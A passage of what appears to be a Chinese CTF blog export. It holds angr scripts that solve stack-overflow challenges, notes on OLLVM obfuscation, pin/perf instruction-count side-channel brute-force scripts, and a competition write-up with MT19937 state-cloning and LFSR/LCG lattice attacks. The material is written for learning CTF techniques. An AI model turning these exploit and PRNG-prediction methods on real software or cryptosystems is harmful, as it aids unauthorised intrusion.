\"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)栈溢出利用——任意写#16_angr_arbitrary_write12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+Ch] [ebp-1Ch] char *dest; // [esp+1Ch] [ebp-Ch] dest = unimportant_buffer; memset(&amp;s, 0, 0x10u); strncpy(password_buffer, \"PASSWORD\", 0xCu); printf(\"Enter the password: \"); __isoc99_scanf(\"%u %20s\", &amp;key, &amp;s); if ( key == 26300398 ) { strncpy(unimportant_buffer, &amp;s, 0x10u); } else if ( key == 55551743 ) { strncpy(dest, &amp;s, 0x10u); } else { strncpy(unimportant_buffer, &amp;s, 0x10u); } if ( !strncmp(password_buffer, \"QOOCPPEV\", 8u) ) puts(\"Good Job.\"); else puts(\"Try again.\"); return 0;}可以看到一样是栈溢出，s长度为0x10,但读入了20字节，可以覆盖dest内容。因此题目目的是，覆盖dest地址为password_buffer地址，当key等于55551743时，会将s的前16字节赋值给password_buffer，最后输出&quot;Good Job&quot;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() class ReplacementScanf(angr.SimProcedure): def run(self, format_string, key_address, input_address): scanf0 = claripy.BVS('scanf0', 4*8) scanf1 = claripy.BVS('scanf1', 20*8) for chr in scanf1.chop(bits=8): # 32&lt;=ch&lt;=127 self.state.add_constraints(chr &gt;= '0', chr &lt;= 'z') self.state.memory.store( key_address, scanf0, endness=project.arch.memory_endness) self.state.memory.store( input_address, scanf1, endness=project.arch.memory_endness) self.state.globals['solution0'] = scanf0 self.state.globals['solution1'] = scanf1 scanf_symbol = '__isoc99_scanf' project.hook_symbol(scanf_symbol, ReplacementScanf()) def check_strncpy(state): strncpy_src = state.memory.load(state.regs.esp+8,4,endness=project.arch.memory_endness) strncpy_dest = state.memory.load(state.regs.esp+4,4,endness=project.arch.memory_endness) strncpy_len = state.memory.load(state.regs.esp+12,4,endness=project.arch.memory_endness) src_contents = state.memory.load(strncpy_src, strncpy_len) if(state.solver.symbolic(strncpy_dest) and state.solver.symbolic(src_contents)): password = \"QOOCPPEV\" password_address = 0x59554248 does_src_hold_password = src_contents[-1:-64] == password does_dest_equal_buffer_address = password_address==strncpy_dest if state.satisfiable(extra_constraints=(does_src_hold_password, does_dest_equal_buffer_address)): state.add_constraints(does_src_hold_password, does_dest_equal_buffer_address) return True else: return False else: return False def is_successful(state): strncpy_address = 0x8048410 if(state.addr == strncpy_address): return check_strncpy(state) else: return False sim = project.factory.simgr(init_state) sim.explore(find=is_successful) if sim.found: solution_state = sim.found[0] solution0 = solution_state.solver.eval(solution_state.globals['solution0'],cast_to=int) solution1 = solution_state.solver.eval(solution_state.globals['solution1'], cast_to=bytes) print(solution0,solution1[::-1]) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)栈溢出利用——任意跳转#17_angr_arbitrary_jump123456int read_input(){ char v1; // [esp+4h] [ebp-24h] return __isoc99_scanf(\"%s\", &amp;v1);}可以看到scanf存在栈溢出，所以是让我们通过简单的ROP，来跳转到print_good12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() class ReplacementScanf(angr.SimProcedure): def run(self, format_string, input_buffer_address): input_buffer = claripy.BVS( 'input_buffer', 64 * 8) # 设置一个较大的input_buffer for char in input_buffer.chop(bits=8): self.state.add_constraints(char &gt;= '0', char &lt;= 'z') self.state.memory.store( input_buffer_address, input_buffer, endness=project.arch.memory_endness) self.state.globals['solution'] = input_buffer scanf_symbol = '__isoc99_scanf' project.hook_symbol(scanf_symbol, ReplacementScanf()) sim = project.factory.simgr(init_state, save_unconstrained=True) def has_unconstrained(): return len(sim.unconstrained) &gt; 0 def has_active(): return len(sim.active) &gt; 0 solution_state = None def has_found_solution(): return solution_state is not None while((has_active() or has_unconstrained()) and (not has_found_solution())): for unconstrained_state in sim.unconstrained: eip = unconstrained_state.regs.eip print_good_address = 0x52425359 if(unconstrained_state.satisfiable(extra_constraints=[(eip == print_good_address)])): solution_state = unconstrained_state solution_state.add_constraints(eip == print_good_address) break sim.drop(stash='unconstrained') sim.step() if solution_state: solution = solution_state.solver.eval( solution_state.globals['solution'], cast_to=bytes) print(solution[::-1]) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)","link":"/f7e7b79c.html"},{"title":"obfuscation &amp;&amp; deobfuscation(1)","text":"之前只会用deflat.py，最近正好学了angr，而且看了下代码也只有三百行不到，所以打算对应着康康原理和代码第一部分简单讲一下工具使用和obfuscation原理obfuscator#是论文《Obfuscator-LLVM — Software Protection for the Masses》的研究成果安装#123456git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.gitcd obfuscatormkdir buildcd buildcmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ..make指令替换#指令替换是将简单的运算替换为较为复杂的运算图1 指令替换表目前支持将加法、减法、与、或、异或替换成等价的相对复杂的运算表达使用时通过加入参数-mllvm -sub使用，并可以通过-mllvm -sub_loop=num指定替换的次数为num次，例如-mllvm -sub_loop=3虚假控制流#虚假控制流是在原来的控制流图上，通过加入条件跳转语句跳转到一个原来的基本块或者是一个虚假的基本块，并最终跳转回条件跳转语句，引入循环结构，改变控制流图。使用时通过加入参数-mllvm -bcf使用，也可以同上一样设置混淆次数-mllvm -bcf_loop=num文中使用的是论文团队之前的工作Bogus Control Flow Insertion，举例：123456void f(int x){ int i; for(i=0;i&lt;x;i++){ printf(\"%d\",i); }}对于上面的函数f，展开前和展开后的结果分别如图2，图3所示图2 加入虚假控制流之前的控制流图![image-20200613002256501](https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133339.jpg)图3 加入虚假控制流后的控制流图控制流平坦化#我们知道一个函数内存在自己的控制流和基本块，控制流平坦化，就是使用一个主分发块，通过条件控制分别进入不同的基本块，然后再回到主分发块，虽然逻辑和原来的程序相同，但分析起来更加复杂，类似于虚拟机，这里用腾讯博客中的图看起来条理比较清晰图4 控制流平坦化前![image-20200613204121588](https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133354.jpg)图5控制流平坦化后注意：这里的基本块号其实标错了，但不影响简单的理解主分发器和基本块的关系这里也给出论文里对函数f的控制流平坦化示例：图6 函数f控制流平坦化结果在工具使用时，加入参数`-mllvm -fla`进行对控制流的平坦化处理，也可以加入`-mllvm -split`激活基本块细分，`-mllvm -split_num=num`将基本块分为`num`份示例 check_password#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int check_password(char *passwd){ int i, sum = 0; for (i = 0; ; i++) { if (!passwd[i]) { break; } sum += passwd[i]; } if (i == 4) { if (sum == 0x1a1 &amp;&amp; passwd[3] &gt; 'c' &amp;&amp; passwd[3] &lt; 'e' &amp;&amp; passwd[0] == 'b') { if ((passwd[3] ^ 0xd) == passwd[1]) { return 1; } puts(\"Orz...\"); } } else { puts(\"len error\"); } return 0;}int main(int argc, char **argv){ if (argc != 2) { puts(\"error\"); return 1; } if (check_password(argv[1])) { puts(\"Congratulation!\"); } else { puts(\"error\"); } return 0;}正常编译#1gcc check_passwd.c -o check_passwd控制流平坦化编译#1/build/bin/clang check_passwd.c -o check_passwd_flat -mllvm-flaemmmm，太大了，还是用腾讯的图好了参考资料#https://github.com/obfuscator-llvm/obfuscator/wiki/Installationhttps://github.com/HikariObfuscator/Hikarihttps://github.com/GoSSIP-SJTU/Armaririshttps://github.com/cq674350529/deflat/blob/master/flat_control_flow/deflat.pyhttps://security.tencent.com/index.php/blog/msg/112论文：Obfuscator-LLVM — Software Protection for the Masses","link":"/cc7a6108.html"},{"title":"pin&#x2F;perf在CTF逆向中的应用","text":"在”深度优先“的学习过程中发现了pin这个工具，之前对于平坦化的程序只会用deflat脚本去平坦化，去不了就只能苦逼的硬调了，直到发现了pin这个工具，打开了侧信道的大门，然后也在搜学习资料的时候搜到了比较轻量的perf工具比较典型的题目有2019 DDCTF 的confused，这里主要拿自己出的一道题目讲一下用法。安装#pin#下载地址：https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html下载对应系统的pin即可123456wget -c https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.13-98189-g60a6ef199-gcc-linux.tar.gztar -xvf pin-3.13-98189-g60a6ef199-gcc-linux.tar.gzmv pin-3.13-98189-g60a6ef199-gcc-linux pincd pin/source/tools/ManualExamples/make all TAEGET=intel64make all TAEGET=ia32perf#ubuntu 16.04， 内核为4.4.0-177123apt install linux-tools-commonapt install linux-tools-4.4.0-177-genericapt install linux-cloud-tools-4.4.0-177-generic使用#侧信道的攻击主要是根据程序执行的指令数目进行攻击，因此只演示指令计数的使用方法pin#pintools的使用为1path/to/pin -t path/to/your/pintool -- path/to/binary &lt;arg&gt;举例来说，在我这里使用pin如下：123456$ ./pin/pin -t ./pin/source/tools/ManualExamples/obj-intel64/inscount0.so -- ./Just_reverse_itInput your flag:12Sorry$ cat inscount.outCount 1941819这里的Count就是从程序开始执行到退出所执行的指令数目了perf#12345$ perf stat -x : -e instructions:u ./Just_reverse_itInput your flag:12Sorry1941433::instructions:u:1330133:100.00这里的1941433就是perf统计指令执行的指令数目了例题#二进制文件：Just_reverse_it题目是一道简单的虚拟机题，逻辑如下1234567891011121314151617# data[i]=0x12^data[i-1]^(input[i]-i)loop: mov reg1,input[reg3] dec reg1,reg3 xor reg2,reg1 mov reg1,0xCD xor reg1,reg2 cmp reg1,data[i] mov reg2,reg1 jz continue return 0 continue: inc reg3 cmp reg3,const jb loop return 1可以看到当其中一个字节输入错误后，就会立刻跳出，而输入正确就会进入下一个字节的运算和比较，因此正确和错误，执行的指令数的差别，就能让我们使用侧信道的攻击方法了。pin exp#12345678910111213141516171819202122232425262728293031323334353637383940414243444546import osimport sysimport subprocessclass Shell(object): def runCmd(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) sout, serr = res.communicate() return res.returncode, sout, serr, res.pid def initPin(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) self.res = res def pinWrite(self, input): self.res.stdin.write(input) def pinRun(self): sout, serr = self.res.communicate() return sout, serrcmd = \"~/pin/pin -t ~/pin/source/tools/ManualExamples/obj-intel64/inscount0.so -- ./Just_reverse_it\"shell = Shell()s = \"\"import stringchs=string.printablefor i in range(48): max_num = 0 max_ch = \"\" for ch in chs: tmp = s + ch +(48-len(s)-1)*'a' shell.initPin(cmd) shell.pinWrite(tmp) sout,serr = shell.pinRun() with open('inscount.out') as f: count = f.readline().split(' ')[1] count = int(count) if(count&gt;max_num): max_num = count max_ch = ch s+=max_ch print(s)perf exp#123456789101112131415161718192021222324252627282930313233343536373839404142434445import osimport sysimport subprocessclass Shell(object): def runCmd(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) sout, serr = res.communicate() return res.returncode, sout, serr, res.pid def initPin(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) self.res = res def pinWrite(self, input): self.res.stdin.write(input) def pinRun(self): sout, serr = self.res.communicate() return sout, serrcmd = 'perf stat -x : -e instructions:u ./Just_reverse_it'shell = Shell()s = \"\"import stringchs=string.printablefor i in range(48): max_num = 0 max_ch = \"\" for ch in chs: tmp = s + ch +(48-len(s)-1)*'a' shell.initPin(cmd) shell.pinWrite(tmp) sout,serr = shell.pinRun() sout = sout.split('\\n')[2] count = int(sout.split('::')[0]) if(count&gt;max_num): max_num = count max_ch = ch s+=max_ch print(s)总结#侧信道的好处在于只需要进行简单的分析，剩下的躺着拿flag就行了，但对于一些指令数目差距不大的题目，侧信道也并不是那么简单，需要自己找一下规律或者改写自己的pin工具。反正我现在碰到简单输入flag的逆向就想先侧一侧或者angr一下。总之能用最好，不能用也不亏，花不了很多时间。参考资料#https://m4x.fun/post/perf-in-ctf/http://m4x.fun/post/pin-in-ctf/https://blog.csdn.net/qq_33438733/article/details/81108186https://blog.csdn.net/qq_33438733/article/details/81137057http://brieflyx.me/2017/binary-analysis/intel-pin-intro/","link":"/c61763eb.html"},{"title":"5space 线下决赛部分 writeup","text":"所以爱会消失对不对babybrain#比赛的时候用pin试了前几个9876还以为是坑，没坚持下去，我真tm脑残step1 pin一下试试#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import osimport sysimport subprocessclass Shell(object): def runCmd(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) sout, serr = res.communicate() return res.returncode, sout, serr, res.pid def initPin(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) self.res = res def pinWrite(self, input): self.res.stdin.write(input) def pinRun(self): sout, serr = self.res.communicate() return sout, serr#cmd = './pin -t ./source/tools/ManualExamples/obj-intel64/inscount0.so -- ./Goodbye1_dump'cmd = './pin -t ./source/tools/ManualExamples/obj-intel64/inscount0.so -- ./babybrain/bf babybrain/brain0'shell = Shell()s = &quot;&quot;import stringchs=string.printablelength = 30chs = string.digitsfor i in range(length): max_num = 0 max_ch = &quot;&quot; for ch in chs: tmp = s + ch +(length-len(s)-1)*'*'+'\\n' shell.initPin(cmd) shell.pinWrite(tmp) sout,serr = shell.pinRun() with open('inscount.out') as f: count = f.readline().split(' ')[1] count = int(count) print(count,tmp,sout) if(count&gt;max_num): max_num = count max_ch = ch s+=max_ch print(max_num,max_ch) print('flag:'+s)用pin可以找到如下规律1234(56705377, '9876114514********************\\n', 'good\\n')(44776176, '9876114514114514**************\\n', 'good\\n')(32847021, '9876114514114514114514********\\n', 'good\\n')(20917774, '9876114514114514114514114514**\\n', 'good\\n')也就是说9876(114514)[1,]是结果的规律，从题目看是一个payload同时过所有的brain，修改一下challenge找规律step2 找规律#123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python3import stringimport subprocessimport hashlibbrain_num = 6def md5(x): m = hashlib.md5() m.update(x) return m.hexdigest()def check_brain(brain, thought): p = subprocess.run([&quot;./bf&quot;, brain], input=(thought+'\\n').encode(), stdout=subprocess.PIPE) r = p.stdout.strip() return r == b&quot;good&quot;if __name__ == &quot;__main__&quot;: #print(&quot;Do you know what a baby is thinking in his brain?&quot;) #print(&quot;If there are multiple answers, give me the shortest one.&quot;) #thought = input(&quot;&gt; &quot;).strip() #assert all(x in string.digits for x in thought) for _ in range(1,120): thought = '9876'+'114514'*_ flag = True count = 0 out = [] for i in range(brain_num): #print(&quot;check&quot;,i) if not check_brain(&quot;brain%d&quot;%i, thought): #print(&quot;wrong&quot;) flag = False out.append(0) #break else: out.append(1) count+=1 print(_,out,count) if(flag): print(&quot;flag{%s}&quot; % md5(thought.encode()))1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191 [1, 0, 1, 0, 0, 0] 22 [1, 0, 0, 0, 0, 0] 13 [1, 1, 0, 0, 1, 0] 34 [1, 0, 0, 0, 0, 0] 15 [1, 0, 0, 0, 0, 0] 16 [1, 1, 0, 1, 0, 0] 37 [1, 0, 0, 0, 0, 0] 18 [1, 0, 1, 0, 0, 0] 29 [1, 1, 0, 0, 0, 0] 210 [1, 0, 0, 0, 0, 0] 111 [1, 0, 0, 0, 0, 0] 112 [1, 1, 0, 0, 0, 0] 213 [1, 0, 0, 0, 0, 0] 114 [1, 0, 0, 0, 0, 0] 115 [1, 1, 1, 0, 0, 0] 316 [1, 0, 0, 0, 1, 0] 217 [1, 0, 0, 1, 0, 0] 218 [1, 1, 0, 0, 0, 0] 219 [1, 0, 0, 0, 0, 0] 120 [1, 0, 0, 0, 0, 0] 121 [1, 1, 0, 0, 0, 0] 222 [1, 0, 1, 0, 0, 0] 223 [1, 0, 0, 0, 0, 0] 124 [1, 1, 0, 0, 0, 0] 225 [1, 0, 0, 0, 0, 0] 126 [1, 0, 0, 0, 0, 0] 127 [1, 1, 0, 0, 0, 0] 228 [1, 0, 0, 1, 0, 0] 229 [1, 0, 1, 0, 1, 0] 330 [1, 1, 0, 0, 0, 0] 231 [1, 0, 0, 0, 0, 0] 132 [1, 0, 0, 0, 0, 0] 133 [1, 1, 0, 0, 0, 0] 234 [1, 0, 0, 0, 0, 1] 235 [1, 0, 0, 0, 0, 0] 136 [1, 1, 1, 0, 0, 0] 337 [1, 0, 0, 0, 0, 0] 138 [1, 0, 0, 0, 0, 0] 139 [1, 1, 0, 1, 0, 0] 340 [1, 0, 0, 0, 0, 0] 141 [1, 0, 0, 0, 0, 0] 142 [1, 1, 0, 0, 1, 0] 343 [1, 0, 1, 0, 0, 0] 244 [1, 0, 0, 0, 0, 0] 145 [1, 1, 0, 0, 0, 0] 246 [1, 0, 0, 0, 0, 0] 147 [1, 0, 0, 0, 0, 0] 148 [1, 1, 0, 0, 0, 0] 249 [1, 0, 0, 0, 0, 0] 150 [1, 0, 1, 1, 0, 0] 351 [1, 1, 0, 0, 0, 0] 252 [1, 0, 0, 0, 0, 0] 153 [1, 0, 0, 0, 0, 0] 154 [1, 1, 0, 0, 0, 0] 255 [1, 0, 0, 0, 1, 0] 256 [1, 0, 0, 0, 0, 0] 157 [1, 1, 1, 0, 0, 0] 358 [1, 0, 0, 0, 0, 0] 159 [1, 0, 0, 0, 0, 0] 160 [1, 1, 0, 0, 0, 0] 261 [1, 0, 0, 1, 0, 0] 262 [1, 0, 0, 0, 0, 0] 163 [1, 1, 0, 0, 0, 0] 264 [1, 0, 1, 0, 0, 0] 265 [1, 0, 0, 0, 0, 0] 166 [1, 1, 0, 0, 0, 0] 267 [1, 0, 0, 0, 0, 0] 168 [1, 0, 0, 0, 1, 0] 269 [1, 1, 0, 0, 0, 0] 270 [1, 0, 0, 0, 0, 0] 171 [1, 0, 1, 0, 0, 1] 372 [1, 1, 0, 1, 0, 0] 373 [1, 0, 0, 0, 0, 0] 174 [1, 0, 0, 0, 0, 0] 175 [1, 1, 0, 0, 0, 0] 276 [1, 0, 0, 0, 0, 0] 177 [1, 0, 0, 0, 0, 0] 178 [1, 1, 1, 0, 0, 0] 379 [1, 0, 0, 0, 0, 0] 180 [1, 0, 0, 0, 0, 0] 181 [1, 1, 0, 0, 1, 0] 382 [1, 0, 0, 0, 0, 0] 183 [1, 0, 0, 1, 0, 0] 284 [1, 1, 0, 0, 0, 0] 285 [1, 0, 1, 0, 0, 0] 286 [1, 0, 0, 0, 0, 0] 187 [1, 1, 0, 0, 0, 0] 288 [1, 0, 0, 0, 0, 0] 189 [1, 0, 0, 0, 0, 0] 190 [1, 1, 0, 0, 0, 0] 291 [1, 0, 0, 0, 0, 0] 192 [1, 0, 1, 0, 0, 0] 293 [1, 1, 0, 0, 0, 0] 294 [1, 0, 0, 1, 1, 0] 395 [1, 0, 0, 0, 0, 0] 196 [1, 1, 0, 0, 0, 0] 297 [1, 0, 0, 0, 0, 0] 198 [1, 0, 0, 0, 0, 0] 199 [1, 1, 1, 0, 0, 0] 3100 [1, 0, 0, 0, 0, 0] 1101 [1, 0, 0, 0, 0, 0] 1102 [1, 1, 0, 0, 0, 0] 2103 [1, 0, 0, 0, 0, 0] 1104 [1, 0, 0, 0, 0, 0] 1105 [1, 1, 0, 1, 0, 0] 3106 [1, 0, 1, 0, 0, 0] 2107 [1, 0, 0, 0, 1, 0] 2108 [1, 1, 0, 0, 0, 1] 3109 [1, 0, 0, 0, 0, 0] 1110 [1, 0, 0, 0, 0, 0] 1111 [1, 1, 0, 0, 0, 0] 2112 [1, 0, 0, 0, 0, 0] 1113 [1, 0, 1, 0, 0, 0] 2114 [1, 1, 0, 0, 0, 0] 2115 [1, 0, 0, 0, 0, 0] 1116 [1, 0, 0, 1, 0, 0] 2117 [1, 1, 0, 0, 0, 0] 2118 [1, 0, 0, 0, 0, 0] 1119 [1, 0, 0, 0, 0, 0] 1step3 CRT#可以看到以下情况为1123456brain0 1brain1 3*ibrain2 1+7*ibrain3 6+11*ibrain4 3+13*ibrain5 34+37*i这就是求一个crt了，求x满足以下条件即可12345x % 3 == 0x % 7 == 1x % 11 == 6x % 13 == 3x % 37 == 34结果为12sage: crt([0,1,6,3,34],[3,7,11,13,37])54720123root@5c619b760e10:~/retools/pin/babybrain# python3 challenge.py54720 [1, 1, 1, 1, 1, 1] 6flag{b65acea9321f62a03d4b28fe689508c6}rkey#123456789101112131415161718192021222324252627282930313233343536373839404142flag=open(&quot;flag&quot;,&quot;r&quot;).read()import osimport randomimport hashlibfrom Crypto.Util.number import bytes_to_long,long_to_bytesfrom Crypto.Cipher import AESdef init(r): sl=[] for _ in range(624): x=os.urandom(4) sl.append(bytes_to_long(x)) st = (3, tuple(sl + [0]), None) r.setstate(st) def gsu(r): return r.getstate()[1][-1] % 624def ss(r,sl,u): s = (3, tuple(sl + [u]), None) r.setstate(s)def gsl(r): return r.getstate()[1][:-1]def renc(r,rkey): sl=gsl(r) su=gsu(r) nsl=[] for i in sl: nsl.append(i^rkey) ss(r,nsl,su)if __name__ == &quot;__main__&quot;: init(random) for _ in range(624): print(random.getrandbits(32),end=&quot;,&quot;) renc(random,_%256) key=long_to_bytes(random.getrandbits(128)) h=AES.new(key,AES.MODE_ECB) print(h.encrypt(flag.encode().zfill(48)).hex())和普通的MT19937预测差别不大，只是题目中一直通过renc函数对state进行异或改变，所以异或恢复回来即可123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105from random import *from Crypto.Util.number import bytes_to_long, long_to_bytesfrom Crypto.Cipher import AESdef invert_right(m, l, val=''): length = 32 mx = 0xffffffff if val == '': val = mx i, res = 0, 0 while i*l &lt; length: mask = (mx &lt;&lt; (length-l) &amp; mx) &gt;&gt; i*l tmp = m &amp; mask m = m ^ tmp &gt;&gt; l &amp; val res += tmp i += 1 return resdef invert_left(m, l, val): length = 32 mx = 0xffffffff i, res = 0, 0 while i*l &lt; length: mask = (mx &gt;&gt; (length-l) &amp; mx) &lt;&lt; i*l tmp = m &amp; mask m ^= tmp &lt;&lt; l &amp; val res |= tmp i += 1 return resdef invert_temper(m): m = invert_right(m, 18) m = invert_left(m, 15, 4022730752) m = invert_left(m, 7, 2636928640) m = invert_right(m, 11) return mdef clone_mt(record): state = [invert_temper(i) for i in record] gen = Random() gen.setstate((3, tuple(state+[0]), None)) return gendef init(r): sl = [] for _ in range(624): x = os.urandom(4) sl.append(bytes_to_long(x)) st = (3, tuple(sl + [0]), None) r.setstate(st)def gsu(r): return r.getstate()[1][-1] % 624def ss(r, sl, u): s = (3, tuple(sl + [u]), None) r.setstate(s)def gsl(r): return r.getstate()[1][:-1]def renc(r, rkey): sl = gsl(r) su = gsu(r) nsl = [] for i in sl: nsl.append(i ^ rkey) ss(r, nsl, su)with open('output', 'r') as f: numbers = f.readline().strip().split(',')ciphertext = numbers[-1]prng = list(map(int, numbers[:624]))record = prngstate = [invert_temper(i) for i in record]for i in range(624): for j in range(0, i): state[i] ^= (j % 256) gen = Random()gen.setstate((3, tuple(state+[0]), None))g = gentmp = []for i in range(624): tmp.append(g.getrandbits(32)) renc(g, i % 256)key = long_to_bytes(g.getrandbits(128))print(ciphertext)h = AES.new(key, AES.MODE_ECB)print(h.decrypt(long_to_bytes(int(ciphertext, 16))))# b'0000000000flag{5FSB8f5ZRwouow77tT09V4icpflf0AIg}'crypto_linear#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import random#from secret import flagfrom Crypto.Util.number import getPrimefrom hashlib import sha256N = 128#assert flag.startswith(b&quot;flag{&quot;)#assert flag.endswith(b&quot;}&quot;)#assert sha256(flag.encode()).hexdigest() == 'cf8b3aa0b672218fa4c7b64eb82186b9d2d022f8faea2a1259e7c9fc5725c196'flag = 'flag{'+'a'*32+'}'def lfsr(R, mask): feedback = R &amp; mask feed_bit = bin(feedback)[2:].count(&quot;1&quot;) &amp; 1 output_bit = R &amp; 1 state = (R &gt;&gt; 1) | (feed_bit &lt;&lt; (N - 1)) return state, output_bitdef gen_lcg(bit_length): m = getPrime(bit_length) a = random.randint(1, m) b = random.randint(1, m) return (a, b, m)def next(state, a, b, m): return (a * state + b) % mdef leak(seed, a, b, m): state = seed for i in range(32): state = next(state, a, b, m) print(str(state &gt;&gt; 128))def main(): outputs = '' state = getPrime(N) print(state) mask = int(flag[5:-1], 16) assert mask.bit_length() == N for _ in range(237): state, output_bit = lfsr(state, mask) outputs += str(output_bit) seed = int(outputs, 2) a, b, m = gen_lcg(2*N) print(a) print(b) print(m) seed = next(seed, a, b, m) leak(seed, a, b, m)main()'''19723442444046227970688609502198989360314795840725848724233989125515381332891983447763911838803860161229073761165459468567319681812687560481363552933806768581697393640575987703423586282311058377539532318691472369538374629773122082926029782791472139709033669805078554790113625205029597951357852458619688917194874159806199029176365391514660175453445149009261329273670617645548606230622069108046532417853520363626910687327364668301866905629821931833736018745870696157855582728403457694964231929562653354178027817844712429743828235794152230122800348240786667500685654975707941444451703738755445152171593772574393558574132121734710248087662187674908659133926469546781741214083259183869998946494565317347596262402123866733587977263767047081228038826202736980181080253070973426385176659656022179039899030527816162974631721631378434094713823785939755317873480604487960250667527460166934447951181632542873120638719727356775589934086209425748591675752252675680773832085133865242691041963408932380360385187233745320099645552147689201245689226315649159381067221751927173322401473016180375193506543095896556423712674109718555846104424148854666757299886973298137655262128843388729958406286436691041300045263185545719480113124900452350138120090653529626932305395198994677243045960062901744672989934572200874534071354709770971087484909907377782097824625427972729259497028432993860634543874439677289091715838321169041409504460600762448169715635675324836784472216060017492844885509149209120676432244783142365900170210500'''从题目看到，先是一个lfsr，其中flag作为mask，将结果通过一个LCG隐藏step1 LCG解seed#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465a = 14795840725848724233989125515381332891983447763911838803860161229073761165459b = 46856731968181268756048136355293380676858169739364057598770342358628231105837m = 75395323186914723695383746297731220829260297827914721397090336698050785547901h = [0, 136252050295979513578524586196889171948, 74159806199029176365391514660175453445, 149009261329273670617645548606230622069, 10804653241785352036362691068732736466, 8301866905629821931833736018745870696, 157855582728403457694964231929562653354, 178027817844712429743828235794152230122, 80034824078666750068565497570794144445, 170373875544515217159377257439355857413, 212173471024808766218767490865913392646, 95467817412140832591838699989464945653, 173475962624021238667335879772637670470, 81228038826202736980181080253070973426, 38517665965602217903989903052781616297, 46317216313784340947138237859397553178, 73480604487960250667527460166934447951, 181632542873120638719727356775589934086, 20942574859167575225267568077383208513, 38652426910419634089323803603851872337, 45320099645552147689201245689226315649, 159381067221751927173322401473016180375, 193506543095896556423712674109718555846, 104424148854666757299886973298137655262, 128843388729958406286436691041300045263, 185545719480113124900452350138120090653, 52962693230539519899467724304596006290, 174467298993457220087453407135470977097, 108748490990737778209782462542797272925, 94970284329938606345438744396772890917, 158383211690414095044606007624481697156, 35675324836784472216060017492844885509, 149209120676432244783142365900170210500]for i in range(len(h)): h[i] &lt;&lt;= 128A = [1]B = [0]for i in range(1, len(h)-1): A.append(a*A[i-1] % m) B.append((a*B[i-1]+a*h[i]+b-h[i+1]) % m)print(A[1:])print(B[1:])M = matrix(ZZ, 33, 33)for i in range(31): M[i, i] = m M[31, i] = A[i] M[32, i] = B[i] M[i, 31] = M[i, 32] = 0M[31, 31] = 1M[32, 32] = 2 ^ 128M[31, 32] = 0vl = M.LLL()[0]l1 = vl[-2]h1 = h[1]s1 = l1+h1s0 = ((s1 - b)*inverse_mod(a, m)) % mseed = ((s0 - b)*inverse_mod(a, m)) % mprint(seed)# 172249955599053439033078493520693122929584790340636422377323636607140227step2 爆破恢复mask#题目给出了237位结果，而我们要恢复mask的话需要256位结果才行爆破，2**19==524288还是可以接受的，在爆破出mask（即flag）后可以通过sha256进行筛选ctfwiki方法#123456789101112131415161718192021222324252627282930313233343536373839404142from sage.all_cmdline import *from hashlib import sha256from tqdm import tqdmGF2 = GF(2)def pad(m): pad_length = 19 - len(m) return pad_length*'0' + mseed = 172249955599053439033078493520693122929584790340636422377323636607140227N = 128# range(267150,267151)for _ in tqdm(range(2**19)): a = bin(seed)[2:] a = a + pad(bin(_)[2:]) #print(a, len(a)) A = [] for i in range(128): A.append([int(op) for op in a[i:i+128]]) A = matrix(GF2, A) # print A.rank() if A.rank() != 128: continue last = a[128:] b = [int(op) for op in last] b = vector(GF2, b) mask = A.solve_right(b) sss = '' for x in range(128): sss += str(mask[x]) sss = sss[::-1] mask = int(sss, 2) mask = hex(mask) flag = 'flag{' + mask[2:] + '}' if sha256(flag.encode()).hexdigest() == 'cf8b3aa0b672218fa4c7b64eb82186b9d2d022f8faea2a1259e7c9fc5725c196': print(flag) exit(0)# flag{a53bde3404aaab1dbb8412542eede2ef}BM算法#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from tqdm import tqdmfrom hashlib import sha256# https://raw.github.com/bozhu/BMA/master/bma.pydef 